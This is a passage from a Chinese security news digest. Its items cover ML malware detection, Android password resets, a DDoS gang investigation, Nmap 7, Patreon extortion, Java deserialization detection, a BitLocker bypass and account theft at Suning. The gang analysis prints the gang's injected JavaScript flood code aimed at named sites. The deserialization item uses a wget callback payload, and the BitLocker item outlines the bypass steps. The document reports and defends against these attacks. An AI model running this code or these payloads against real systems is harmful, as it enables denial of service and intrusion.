“据我所知，虽然反病毒公司的收入依然来自基于签名的检测方法，但他们已经开始涉足机器学习领域的研究。他们通过基于文件哈希值或者根据人类分析师提供的给定样本进行模式匹配的方式，进行恶意软件检测。”“然而，相比于发现一个新的恶意软件，这些公司更擅长成功检测已经发现过的恶意软件，这也是网络犯罪在当下得以大行其道的原因之一。由于基于签名的验证并不奏效，即使你安装了反病毒软件，其他人还是能够成功地入侵你的电脑。”Saxe主导的一个运用机器学习技术建立更完善的恶意软件检测系统――Invincea项目是美国国防部高级研究计划局DARPA网络基因组计划（Cyber Genome project）的一部分，特别是使用机器学习去探测恶意软件，功能包括恶意软件如何工作的逆向工程、执行社交网络代码分析以及利用基于机器学习的系统快速获取恶意软件样本。

“经验证实了我们使用机器学习开发的模式要比传统反病毒系统的表现更加优秀。机器学习系统能够从事人类分析师一直从事的工作，甚至完成得更为出色。当你将机器学习与大量训练数据结合，事实证明你可以打败基于签名系统的检测机制。”Invincea使用深度学习的方法加速算法的训练。目前，Saxe拥有大约150万个良性或恶意软件样本，他通过使用Python工具在GPU上对样本进行的算法训练。随着数据库增加到3000万，他预计未来优势会呈线性增长。

Saxe说：
“我们拥有更多训练数据，便可以更好的将其运用于训练恶意软件机器学习系统，机器学习系统具有更多优势后，便能在检测恶意软件时拥有更加表现。”Invincea现在的规划是在2016年时实现将基于深度学习的能力添加到其开发的末端安全产品上。具体而言就是，机器学习技术将会作为一个特性被添加到安全产品Cynomix。

恶意软件使用者检测
从另一个视角看，机器学习同样有助于维护IT安全：检测恶意软件的内部使用者并确定受危害的账户。
正如主流反病毒产品依赖目录中的签名识别恶意软件，用户活动监视工具同样也依靠签名。目前基于签名的恶意软件检测表现糟糕，同样的情况也出现在用户活动监控方面。
Exabeam（一家提供用户行为分析工具的公司）首席数据科学家Derek Lin表示：
“我们根据过去的经验发现，企业安保人员十分依赖使用签名验证的安全产品，例如IP地址黑名单。他们寻找的是已经发生的事情。可问题是基于签名的检测方式只能是事后诸葛。这段时间安全研究者持续将重心放在检测没有签名的恶意软件事件之中。”事到如今，精明的网络罪犯通过略微的策略改变便可以击败基于签名的检测方式。因此如果检测系统遭到入侵，攻击者便可以轻易地获得系统中的黑名单。

相较于去年防守策略，基于Gartner提出的用户行为分析（UBA）概念，今年Exabeam采取了更为积极的方式。用户行为分析（或其相关概念：用户及实体行为分析）的想法可理解为不需要判断用户或者设备的好坏。你假设所有都是坏的，你的网络是被入侵的，继而你需要通过不断地监控和模仿所有的行为来发现坏因子。
Lin和他的团队使用多种监控与非监控机器学习算法来进行用户异常行为检测，来源包括很多，例如服务器日志、Active Directory条目以及VPN日志。
这些都是为了分析用户行为，而问题则是要如何做到这一点。Lin说：
“对于网络中的每一个用户和实体，我们试图建立一个常规统计分析页面。然后在概念层寻找出现的偏差现象…我们使用基于行为的方法来寻找系统中的异常，并将其表面呈现给安全研究者。”安全行业之机器学习未来

基于我们所经历过的重大安全事故及数据泄露事件，网络罪犯所采用攻击方法也可以为吾等良善之流所用。安全软件供应商Townsend Security创始人Patrick Townsend表示：
“目前我们正逐步建成可以对检测的海量非结构化数据和检测模式进行高效处理的系统，我预想下一代安全产品会是基于感知计算（cognitive computing）的。就拿IBM超级电脑Watson来说，它在人机对战练习赛中险胜战胜了美国智力竞赛节目《危险边缘》(Jeopardy)的两位冠军选手。既然如此，它为什么不能解析全球发生的所有安全事件并让它们变得更有价值呢？我认为，将基于感知的计算技术运用于安全，我们仍处于初始时期。”Invincea公司的Saxe期望：

“一些公司没有意识到基于深度学习新方法下的产品化算法浪潮已经到来，对此我并不惊讶。目前我们所用机器学习模型的训练才实现不久，而在十年前，你是无法有效完成这一切的。”




-----------------------------------------------------------12-----------------------------------------------------------
0X12: 
     [11.30]谷歌可远程更改安卓设备密码，影响74%设备 

=700) window.open('http://image.3001.net/images/20151124/14483423106332.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
根据纽约地区检察官办公室的一份报告所述，只要有法院命令，谷歌能够非常容易地远程重置旧版本Android系统的密码，调查人员可以轻易地查看设备上的内容。
这份报告同时指出运行Android 5.0（及更新的系统）的设备将无法进行远程重置，因为新系统采用全盘加密，虽然很多设备上这项功能不会默认开启，而早期的Android版本就可以进行远程重置。
影响设备范围较广
根据Android Developer Dashboard的最新数据，约有74.1%的设备还在运行Android 4.4及更早版本的Android系统。也就是说，谷歌有能力对74.1%的Android设备进行远程的密码重置操作。
=700) window.open('http://image.3001.net/images/20151124/14483424267856.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
在目前的报告中描述道，执法鉴证人员能够在某些设备上，运用一系列的法律条款绕过密码审查。在有搜查许可或者有命令要求协助执法机关从设备解密数据的情况下，对某些类型的Android设备而言，谷歌能够重置设备密码。整个过程可由谷歌远程进行，可让法院相关人员查看设备上的内容。而苹果用户在这方面则稍好一些，运行iOS 8及更高版本的iOS系统的设备，无法绕过密码访问数据，而且全盘加密是默认选项。
安卓系统安全问题惹人担忧
根据mobipicker.com网站的披露，安卓系统的安全性目前处于一种脆弱状态，例如，今年九月就曾经有人发布报告声明，安卓系统最新漏洞使得成千上万安卓系统设备处于危险中。还有今年公布的一个漏洞，该漏洞广泛存在于Android 5.0及以上版本的安卓手机，通过简单几步即可绕过锁屏密码进入主屏。这一漏洞的发现者、美国德克萨斯州一所大学的安全分析师John Gordon称，绕过锁屏之后，别人可以轻松进入开发者模式，通过USB往你的手机里安装恶意软件。
Gordon在Nexus手机上测试后发现了这一问题，并且将其提交给了谷歌。不过由于Android手机的碎片化太严重，除了谷歌自家的Neuxs手机，其他厂家的手机目前还收不到这一补丁，这也意味着大部分的安卓手机仍有风险。
如果想要安卓设备更安全一些，可以在设置里面的“security”或者“storage”中找到全盘加密的选项，根据不同设备制造商，可能会存在差异。
详细报告（点我）
 





-----------------------------------------------------------13-----------------------------------------------------------
0X13: 
     [11.30]从异常挖掘到CC攻击地下黑客团伙 

异常挖掘与回溯
11月13日，百度云安全天网系统，通过数十TB的日志挖掘，发现了安全宝某重点客户网站上的异常行为。之后我们的分析人员跟进，发现这是一起针对安全宝某重点客户的持续攻击。最终在客户系统上放置了Web后门。
该Web后门的通信如下：
POST /uc_server/data/logs/20140708.php?v=1a HTTP/1.1Host: bbs.xxxxx.comReferer: http://bbs.xxxxx.com/uc_server/data/logs/20140708.php?v=1aUser-Agent: SogouContent-Length: 60从通信流量上看，并未触发任何报警。同时，客户的日志里也并未保存http response的数据。
天网系统中的谛听模块通过对网站的访问行为进行建模，通过每个被防护的网站日志训练出这个网站特有的访问模型。包括网站参数的模型，网站访问路径的模型，网站访问session的模型。黑客这次的访问行为触发了网站访问路径模型的异常。该模型中通过每个路径访问的频度广度和路径之间的访问关系等feature，训练出针对每个网站特定的路径视图。
我们在系统中对该客户的所有历史日志进行了回溯，发现该黑客在9月24日就已经对该客户展开了尝试性的攻击。
通过进一步的分析，我们发现，该攻击者修改了Discuz系统的class_core.php。在该class_core.php中添加的代码如下：
=700) window.open('http://image.3001.net/images/20151125/14484144886622.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
从该代码中，我们可以做出以下结论：


1. 这次攻击不是小范围的针对单个站点的攻击，而是攻击了多个站点；2. 该代码中并未指定特定的CC攻击的目标，而是通过Location统一跳转到http://file.lbgoo.com/file_120/37/ver.php，由该url指定最终的攻击目标。影响确认和攻击代码
我们从CC的攻击代码中提取了以下特征fuwuqibeiheikeruqin，在现有的网页情报库中搜索，发现以下的链接地址：
http://www.eoeandroid.com/forum.php?wangzhanbeihei&ampfuwuqibeiheikeruqin&ampqinggenghuanfuwuqi&ampchongzhuangwangzhan
判断eoeandroid也被这样攻击过。
11月20日，http://file.lbgoo.com/file_120/37/ver.php 请求被重定向到http://www.eoeandroid.com/forum.php? ，11月20日发现eoeandroid已经503了。该攻击手法被进一步确认
我们又对该代码中提及到的php100.comwww.dm123.cn和12edu.com进行访问。发现如下：

以dm123.cn为例：


=700) window.open('http://image.3001.net/images/20151125/14484145334248.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
显然该网站被利用来做CC攻击。 
同时我们针对以上网站挂CC攻击的js进行了分析，发现有三种。
1. dm123.cn中，直接在dm123网站上挂js，脚本路径如下：
http://www.dm123.cn/gd.js
2. php100.com中，托管在SAE上的攻击脚本，脚本路径如下：
http://jsddos.sinaapp.com/ddos.js
3. 12edu.com中，通过api接口动态获得要攻击的网站，更加难以定位：
http://www.12edu.com/api.php?op=count&ampid=34380&ampmodelid=1 
以上三种方式，从扫描器检测的角度来看，复杂度逐渐增大。第一种情况下，是直接检测本域下的js。第二种则需要检测外链js，检测量大大增大了。而第三种则是在已有的js里面没有攻击代码。攻击的代码是通过api接口动态获得的。
攻击用的js代码如下：
function imgflyygffgdsddfgd() {var TARGET = 'www.hanyouwang.com'var URI = '/index.php?wangzhanbeihei&ampfuwuqibeiheikeruqin&ampqinggenghuanfuwuqi&ampchongzhuangwangzhan&amp'var pic = new Image()var rand = Math.floor(Math.random() * 1000)pic.src = 'http://'+TARGET+URI+rand+'=val'}setInterval(imgflyygffgdsddfgd, 0.1)function imgflyygffhghddfgd() {var TARGET = 'www.weshequ.com'var URI = '/Search/v-wangzhanbeihei&ampfuwuqibeiheikeruqin&ampqinggenghuanfuwuqi&ampchongzhuangwangzhan&amp'var pic = new Image()var rand = Math.floor(Math.random() * 1000)pic.src = 'http://'+TARGET+URI+rand+'=val'}setInterval(imgflyygffhghddfgd, 0.1)被攻击域名包括重要政府网站和国家级新闻媒体。
身份确认
通过域名的相似度，我们在现有的网页情报库中发现了如下域名：
博客：http://jsddos.blog.163.com/
论坛：http://www.jsddos.com/
在163博客上可以看到，该团队名 ddos Js团队， QQ 155****222
在网页情报库中查找该QQ，可以发现http://www.mspycn.com/about.html
看来除了卖ddos的服务，还在卖手机监听软件的服务。
对该域名的whois进行查询，如下：
[/url] 



-----------------------------------------------------------14-----------------------------------------------------------
0X14: 
     2015年陕西省网络空间安全技术大赛 

2015年陕西省网络空间安全技术大赛



-----------------------------------------------------------15-----------------------------------------------------------
0X15: 
     [11.24] 安全扫描神器Nmap 7新版发布 

=700) window.open('http://image.3001.net/images/20151122/14481572995385.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
在长达3.5年之后，Fyodor终于发布了著名开源网络检索工具的最新版本Nmap7。
Nmap 7功能变化
=700) window.open('http://image.3001.net/images/20151123/14482473953522.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
在长达3.5年之后，Fyodor终于发布了著名开源网络检索工具的最新版本Nmap7。Nmap是最受欢迎的开源网络映射器之一，据称这次发布的版本中主要的变化包括以下几点：
―自从Nmap 6以来共有3200份代码提交―扩大了其脚本引擎的功能，包括171个新的NSE脚本―在主机发现、端口扫描和系统检测方面，提供了成熟的IPv6支持此外，Nmap7这款自动化的扫描器能够轻易检测到Heartbleed、POODLE、FREAK等严重漏洞。Nmap 7中对ssl-enum-ciphers（SSL枚举密码）脚本替换了新的实现算法，使得它能够通过枚举SSL/TLS协议版本和密码套件来快速分析TLS连接，它还能够迅速识别部署问题。
另外，使用Nmap 7能够轻易发现包含漏洞的服务器，Nmap 7中包含了对提速和扫描实现的改进。这个工具的新版本包括一个更新、更快的Nmap脚本引擎（Nmap Scripting Engine，NSE），同时它还允许用户编写Lua脚本。
Nmap 7版本简介中提到：

“现在，与-sV配合使用的强大RPC grinder成为了NSE脚本的一部分：rpc-grind。这允许我们剔除一堆古老的C代码，而选择更易于维护的Lua代码，同时在扫描速度方面有了明显的改善，而这些功能仅仅使用了原来代码量的五分之一。”
=700) window.open('http://image.3001.net/images/20151122/14481576685699.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
支持可解析的XML输出
Nmap 7中可用的脚本库从原来的348个扩展到了现在的515个，其中的一些脚本能够用来快速检测SSL漏洞（例如Heartbleed、POODLE和Shellshock），以及HTTP漏洞，例如Slowloris和Misfortune Cookie。
新引擎还可以输出可解析的XML文件，并实现了对跨脚本共享库的支持。
“最新的NSEN引擎能够输出可解析的XML文件。在Nmap XML输出中的不只是一个文本的二进制对象，该脚本引擎现在能够返回结构化的信息，通过一个XML解析器能够快速提取到这些信息。所有新的脚本都产生了结构化的输出，大多数旧的脚本现在已经转换过了，并且任何使用了vulns库的脚本都会自动升级。”下载Nmap 7，请点击这里。





-----------------------------------------------------------16-----------------------------------------------------------
0X16: 
     [11.24]音乐众筹网站Patreon数据泄露后遭邮件勒索 

=700) window.open('http://image.3001.net/images/20151122/14481672122562.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
Patreon是由音乐家Jack Conte及开发人员Sam Yam2013年创立的众筹网站，主要是替音乐或影片的作者筹募集创作基金。

比特币交易，赎回个人信息
音乐众筹网站Patreon于上个月经历的一次大型网络攻击导致近15GB的客户数据遭到曝光，当中包括了他们的名字及捐款数额等。不过，Patreon官方表示，他们的信用卡信息非常安全，而像密码、社保号及税单也都没有被盗走，其使用的是2048位RSA密匙。不过用户最新收到的恐吓邮件带来的却是另外一个故事，税单号、税单、信用卡等敏感信息都已被黑客掌控。
众筹网站Patreon近日收到邮件称，如果用户想要要回自己的信息，需要向他们提供1比特币的赎金，并还在上面附上了提交比特币的网站。
=700) window.open('http://image.3001.net/images/20151122/14481672657632.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
Patreon泄露数据事件回顾
今年拥有微软最有价值专家（Microsoft Most Valuable Professional，Microsoft MVP）头衔的独立安全研究人员Troy Hunt在他自己所设立的haveibeenpwned网站上表示，音乐众筹网站Patreon已遭恶意攻击者入侵，并有超过16GB的资料在网络上流窜。Patreon也已证实此事。后来Patreon共同创办人Conte坦承此事，说明该站是在9月28日发觉被非法入侵，恶意攻击者入侵的是正在公开测试的网站，该测试网站含有一个运作中的资料库快照，但并未储存可存取其他服务器的私密密匙。
在得知遭到入侵后便关闭了测试网站的服务器，并将所有非运作中的服务器全数移到防火墙之后。恶意攻击者所存取的资料包含注册姓名、捐款数额、送货地址，以及2014年以前的某些帐单地址。不过Patreon并未储存完整的信用卡信息，而信用卡号码也未被存取。


现在，这种勒索情况变得越来越多，犯罪分子利用用户数据要求获得赎金的做法开始成为一个常态。不过这次情况不同以往的是，由于此前用户数据已经遭到曝光，并且邮件还提供了一个普通的比特币提交网站，所以它还算不上是一个大威胁。





-----------------------------------------------------------17-----------------------------------------------------------
0X17: 
     [11.24]Java反序列化漏洞批量检测（附POC） 

 
本文作者：魔方安全团队
前言
Java反序列漏洞出现在人们视野已经有一段时间了，魔方安全团队对这个漏洞进行了复现，同时研究出了一种准确性较高的批量检测的思路，在此与各位安全圈的朋友分享。
背景
2015年11月6日，FoxGlove Security安全团队的@breenmachine 发布的一篇博客中介绍了如何利用Java反序列化漏洞，来攻击最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，实现远程代码执行。
其实早在2015年的1月28号，国外的安全研究员Gabriel Lawrence和Chris Frohoff在AppSecCali上给出了一个报告，报告中已
经指出Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行。
Java反序列漏洞简介
序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectInputStream类的readObject()方法用于反序列化。下面是将字符串对象先进行序列化，存储到本地文件，然后再通过反序列化进行恢复的样例代码：
public static void main(String args[]) throws Exception {String obj = &quothello world!&quot// 将序列化对象写入文件object.db中FileOutputStream fos = new FileOutputStream(&quotobject.db&quot)ObjectOutputStream os = new ObjectOutputStream(fos)os.writeObject(obj) os.close() // 从文件object.db中读取数据FileInputStream fis = new FileInputStream(&quotobject.db&quot)ObjectInputStream ois = new ObjectInputStream(fis)// 通过反序列化恢复对象obj String obj2 = (String)ois.readObject()ois.close()}问题在于，如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。
所以这个问题的根源在于类ObjectInputStream在反序列化时，没有对生成的对象的类型做限制；假若反序列化可以设置Java类型的白名单，那么问题的影响就小了很多。
本文针对该漏洞的原理将不再详细描述，可参考长亭科技在11月初发布针对该漏洞的详细原理介绍：Lib之过？Java反序列化漏洞通用利用分析
漏洞检测
检测用工具
该漏洞的利用方法目前已经有成型的工具，其中包括国外研究者编写的ysoserial，以及国内研究者编写的serial.jar，均可以生成攻击payload。
检测思路
拓扑结构： 
 
由于目前来说暂未发现可直接回显结果的方法，单纯检测包返回结果无法很精确的发现是否存在漏洞，因此我们采用了结合第三方的方式进行批量检查，检测服务器发送payload到受检测主机，受监测主机执行远程命令访问测试服务器打开的Web服务，登录测试服务器查看测试服务器的Web访问日志日志，确认受检测主机IP地址是否在日志文件上，测试服务器日志上存在受监测主机的IP地址，则可以确认受监测主机执行了命令，存在漏洞。

本次测试以使用最多的Weblogic为例，使用工具生成 payload ,payload中执行的命令为 

wget http://x.x.x.x/libreversex.html其中x.x.x.x为我们搭建用于接受wget命令的测试服务器的IP

然后利用国外的POC进行修改，在代码后面加入远程读取服务器日志，并匹配日志中是否存在该IP地址，其中读取目标服务器访问日志，我们使用了一个技巧，即将目标服务器的Web访问日志做个硬链接到Web目录下，这样就可以远程直接读取Web日志进行比对，确认该IP是否存在安全漏洞：
 
运行结果
 
在批量检测过程中，我们发现并不是说仅有7001存在该安全漏洞，部分站点80端口也存在该漏洞，因为只要是接受T3协议的端口均会存在该安全漏洞。
检测方法总结
优点:
该检测方法直接通过执行命令方式并查看执行结果的方式进行检测，准确率高。
缺点:
1. 若内网防火墙禁止内部主机主动访问外部，则无法成功检测，因此存在漏报的可能。
2. 对于windows下的主机，由于无wget命令，无法使用该方式检测。
参考资料：
http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
https://github.com/CaledoniaProject/jenkins-cli-exploit
http://blog.chaitin.com/2015-11-11_java_unserialize_rce/?from=timeline&ampisappinstalled=0#rd
 
 
 





-----------------------------------------------------------18-----------------------------------------------------------
0X18: 
     英国一名15岁男孩被指攻击全球网络和散布暴恐信息 

=700) window.open('http://image.3001.net/images/20151118/14478284746410.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
一名英国青少年被指控一系列针对全球多家网站的网络攻击，并通过社交媒体散播美国境内各大航空公司存在炸弹威胁的虚假恐怖信息。
目前根据其它报道称，该名男孩不清楚具体出于什么目的导演了这起事件，他在散布的谣言中也可能包含白宫出现炸弹的威胁。这名年仅15岁的青少年来自英国英格兰西南区普利茅斯（Plymouth）。在经过德文郡当地网络犯罪部门和康沃尔郡警方的详细调查，本周一被指控违反了计算机滥用法案（Computer Misuse Act）第3章节的三项罪名和刑事法第51章节的两项罪名。德文郡（Devon ）和康沃尔郡（Cornwall）警方表示，这名少年被控违反了《滥用计算机法案》第三章节的三项罪名，同时还违反刑事法第51节的两项罪名。
该男孩造成巨大损失
在美国弗罗里达州的一个海洋主题公园因为男孩的恶作剧已经损失了100万美元。该男孩还在社交网络里面散布某处出现炸弹消息 ，不仅仅针对两家美国航空公司，甚至散布有关白宫的虚假信息。
这名男孩最终在家中被警方逮捕，同时被控违反了《滥用计算机法案》第三章节的三项罪名，同时还违反刑事法第51节的两项罪名。目前警方表示：“这几项指控都是与本人有直接关联，而不是恶意攻击网站导致网站关闭那么简单。”还有一些企业以及政府部门表示：“虽然这名男孩的背景只是一个普通的家庭，但是他已经造成企业相当大的损失。”
该名嫌疑人并未参与TalkTalk网络攻击事件
德文郡和康沃尔郡的警方明确表示这起事件不是TalkTalk那次网络攻击事件的犯罪嫌疑人，之前已经逮捕有关talktalk网络攻击事件的犯罪嫌疑人。
该名男孩目前指控涉及在非洲、亚洲、欧洲和北美地区进行大面积DDoS网络攻击，并通过社交媒体散播针对美国航空公司的虚假谣传。但是根据警方透露，在指控中并未涉及最近针对英国广播和付费电视机构TalkTalk的网络攻击。该青年目前已经保释，但要求12月18日在普利茅斯青年法庭上出庭。同时警方证实，这名少年的犯罪行为都是在过去一年中犯下的。





-----------------------------------------------------------19-----------------------------------------------------------
0X19: 
     苏宁易购账户莫名消失 个人信息泄露并非个例 

长沙市民张畅在苏宁易购注册的账户，有过一段“失而复得”的经历，虽然在其多次投诉下，苏宁易购最终为其找回了账户，但这个账户到底是如何莫名消失的，张畅至今还没有得到苏宁易购的明确答复

　　电商，正在快速地改变着人们的生活方式和消费观念，在电商和消费者的共同作用下，“双11”已彻底由“光棍节”演变成了“狂欢购物节”。

　　每年“双11”狂购过后，销售假货、虚假降价、刷单冲量、延迟送货等问题就会成为消费者投诉的重灾区。随着电商的不断发展，客户信息和账户安全又成为了令消费者担忧的一件事。

　　近日，湖南省长沙市民张畅(化名)在苏宁易购[微博]注册的账户，就有过一场“失而复得”的经历，虽然在其多次投诉下，苏宁易购最终为其找回了账户，但这个账户到底是如何莫名消失的，张畅至今还没有得到苏宁易购的明确答复。

　　而苏宁易购在接受法治周末记者采访时解释称，造成顾客账号无法登录的原因有多种，此案例属于个例，暂未发现有同类型的情况存在。

　　在电商经济迅猛发展的今天，如何才能确保消费者的账户信息安全，成了一个不容忽视的问题。

　　账户莫名消失

　　苏宁易购，作为苏宁云商(15.22, 0.11, 0.73%)集团股份有限公司旗下的新一代B2C网上购物平台，现已覆盖传统家电、3C电器、日用百货等品类。

　　2011年7月20日，张畅在苏宁易购公司官方网站成功注册了账户，几年来，该账户一直在正常使用。今年9月中旬的一天，张畅准备在苏宁易购下单购买商品，当其登录账户时，却发现显示“账户不存在”。

　　张畅于是马上拨打苏宁易购服务热线反映相关情况，一天后，该公司客服答复：“这个账户从来没有在苏宁易购网站注册过，这个账户不存在。”

　　“我每次购物后，都有苏宁易购网络系统发来的购物订单确认信息，而接收购物确认信息的正是我注册账户的QQ邮箱。”当张畅以“购物订单确认信息”质疑苏宁易购公司“账户不存在”的说法后，客服人员答应再去调查，然后答复。

　　几天后，苏宁易购客服人员又打来电话说，张畅的账户被他人替换了，无法找回。“我的账户里面有我的个人信息资料，我不想这样不明不白地丢了。”在张畅的强烈要求下，苏宁易购的客服人员答应再去调查协调。

　　张畅第三次拨打苏宁易购的客服电话，客服人员答复：“原来账户已经被人替换了，替换的账户为‘neipin056468@163.com’。”客服人员建议让她先用账户neipin056468@163.com登录，然后申请找回密码。但是，当张畅登录此账户，准备找回密码时，才发现绑定的手机号码已经被一同更改了，所以无法使用此项功能。

　　几天后，张畅第四次拨打苏宁易购服务热线时，客服仍说是账户被替换，需要通过人工申诉来找回密码。

　　账户丢失后，张畅在百度搜索如何解决这种情况时，才发现有很多网友在网上发帖称有过“账户莫名丢失”的类似情况。

　　11月8日，在不断地与苏宁易购客服电话沟通后，张畅的账户被找回了。

　　“作为一名在苏宁易购购物达4年的老客户，我的账户到底因何丢失?苏宁易购公司至今没有给我一个明确的答复。”张畅对法治周末记者说。

　　账户因何消失未有定论

　　“如果是单独的账户被黑客盗取，只会是密码丢失，账户还是会存在的，为什么当初我的账户显示是‘不存在’。再说，外部黑客是无法登录苏宁易购内部平台删除客户账户的，而且我的手机也从未收到过更改账户的短信验证。”张畅对苏宁易购公司的回复提出了质疑。

　　11月11日，法治周末记者带着疑问来到苏宁易购位于江苏南京的总部进行采访。11月12日晚间，苏宁易购给记者发来了相关问题的《回复》。

　　《回复》中强调：“苏宁易购非常重视用户信息安全，用户敏感信息都经过多重不可逆算法加密，安全强度高，目前未有发现被破解。”

　　苏宁易购系统设置安全登录的保护功能，针对用户异地登录、异常登录，系统会自动要求用户进行手机短信验证身份，增加用户信息的安全性。”

　　但苏宁易购在《回复》中谈到张畅的账户是因何原因无法登录时称：“造成顾客账号无法登录的原因有多种，比如，由于个人账号被恶意盗取、信息被篡改，顾客账户信息在不安全网络情况下使用(如不安全的免费WiFi)，或在不同网站使用的是相同的账号密码致使购物、支付等信息被黑客截取等。”

　　据中国电子商务研究中心发布的《2014年度中国电子商务用户体验与投诉监测报告》指出，信息泄露已然成为2014年度生活服务电商十大热点投诉问题。

　　个人信息泄露并非个例

　　苏宁易购公司《回复》中还称：“由我司相关人员联系顾客，在顾客同意并提供个人资料进行系统审核通过后，账号于11月8日恢复正常使用，投诉已解决。目前贵媒体反馈的案例属于个例，暂未发现有同类型的情况存在。”

　　法治周末记者注意到，近几年凡是出现客户因信息泄露和账户被盗等类似原因的投诉，苏宁易购都以“没有查询到因为苏宁易购系统的原因所导致的信息泄露”，不可能对受害者进行赔偿，并要求受害者报警。

　　法治周末记者通过百度搜索“苏宁易购账户”关键字，立马跳出很多与张畅类似的情况信息。其中一位网名为“fzyixiantian”的用户，于2014年7月9日在百度发帖称：自己在苏宁易购注册的账号绑定了一个陌生的深圳手机号和一张宁夏地区的苏宁门店卡，而身份信息还是本人的，账户里面的积分都被兑换成券购买产品了。

　　一位叫“babayah”的用户，2015年10月4日在网上也吐槽，说9月22日在苏宁易购官网点击“降价通知”的时候，发现手机号并不是他的，问客服说他的账户是安全的，把手机号改过来就行，再担心的话就把密码改一下，其当时就没改密码。10月1日再登录时，说他的账户不存在，10月4日还是说账户不存在。

　　2015年9月26日，网名叫“明月几时有2212“的在百度贴吧反映，几年前注册了一个苏宁易购账号，手机上也装了一个苏宁易购的APP。23日8点左右发现手机上有一个APP推送的消息：您购买的商品已发货。可是我这二天没有买过东西呀，所以进去看看，是有人用我的账号买了两袋米，用了我两个优惠券。以为是密码被盗用了，取消了订单后顺手修改了密码，发现对方是在23日凌晨0：40左右在烟台网页登录下的订单，收货地址在江苏宿迁。24日8点左右手机上又有一个同样发货的消息，用23日修改后的密码进去发现又有人下了一个订单，还是同样两袋米，用了两个券。登录地为烟台移动，收货地同样在江苏宿迁泗洪。问题的关键在于：“我修改了密码，他如何用我修改的密码登录?在我原绑定的手机号没有收到验证码的情况下，他如何修改绑定手机号的?登录地在烟台，收货在宿迁。”

　　据《南方周末》报道：自2012年6月至2015年9月，第三方安全漏洞平台“乌云平台”共发布苏宁易购系统漏洞270条，其中在2015年发布的漏洞数目显著增多，仅6月就发布了58条。

　　中国互联网络信息中心(CNNIC)发布的《中国网民权益保护调查报告(2015)》显示，近一年来，网民因个人信息泄露、垃圾信息、诈骗信息等现象，导致总体损失约805亿元，人均124元，其中约4500万网民近一年遭受的经济损失在1000元以上。

　　7月6日，《网络安全法(草案)》对外公布，并向社会公开征求意见。

　　草案提出，网络运营者应当建立健全用户信息保护制度，加强对用户个人信息、隐私和商业秘密的保护网络运营者对其收集的公民个人信息必须严格保密，不得泄露、篡改、毁损，不得出售或非法向他人提供。

　　工信部电子科学技术情报研究所总工尹立波认为：《国家网络安全法》从网络运行安全、关键信息基础设施安全、网络信息安全、法律责任等方面进行了明确规定，将等级保护、网络产品与服务安全、网络安全信息共享、个人信息保护等多项工作纳入法律轨道，为保障国家网络安全、促进我国信息化健康发展，提供了高层次的法律依据。




-----------------------------------------------------------20-----------------------------------------------------------
0X20: 
     [11.20]微软修复Bitlocker驱动器加密工具的绕过漏洞 

=700) window.open('http://image.3001.net/images/20151118/14478295085397.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
微软最近修复了Windows Bitlocker驱动器加密中的一个漏洞，这个漏洞可以被用来快速绕过加密功能获取到受害者加密的重要信息。
加密软件中的漏洞
磁盘加密工具是一个重要的保护软件，所有的电子设备都需要依靠它们来保护用户的数据。在它们出现之前，攻击者只需要启动Linux，然后安装存有用户数据的磁盘就可以访问用户的加密文件了。
但是，这些软件也存在着漏洞给黑客们机会。
九月，谷歌Project Zero团队的安全专家James Forshaw在Windows系统上安装的加密软件TrueCrypt发现了两个高危漏洞。TrueCrypt去年就改用了微软的Bitlocker。也就是说这两个高危漏洞是Bitlocker的。
攻击方法
根据Synopsys安全公司的专家Ian Haken最近进行的研究表明，BitLocker的安全功能可以被绕过，而且过程还不复杂。
=700) window.open('http://image.3001.net/images/20151118/14478288268089.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
Haken在他的报告中解释说，如果个人计算机已经加入到一个域或被授权的域用户之前登陆过该计算机，那么黑客就可以通过用户曾经使用的密码设置一个模拟域控制器进行攻击。
下图是在基于Debian的Linux的使用Samba的操作，假设目标设备连接到MISKATONIC域并且用户的帐户名是ihaken。
=700) window.open('http://image.3001.net/images/20151118/14478358578246.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
执行这种攻击时，攻击者可以从网络流量中获取到域名和用户名,然后再将目标设备连接到域控制器鉴别过的网络。
之后，黑客就可以使用域用户之前在该设备上使用过的密码（“password!23”）登录。由于该密码是过期密码，计算机会让黑客设置一个新的密码。只要最后禁用该计算机的网络连接，用新的密码登录就可以了。
“一旦登录上，黑客就可以访问到用户的所有数据，如电子邮件、知识产权、保存的密码，缓存的凭据等。如果用户是本地管理员，黑客还可以从内核内存中获取到BitLocker密钥。”微软最新修复
微软刚刚修复了这一漏洞，在最新的安全更新中包含了该漏洞的修补程序，并在MS15-122安全公告中报道出来。









-----------------------------------------------------------21-----------------------------------------------------------
0X21: 
     [11.20]BBScan：信息泄漏批量扫描脚本 

有些朋友手上有几十万甚至上百万个域名，如果把这些域名全部扔给wvs、 APPscan这样的重型扫描器，显然是不太合适的。
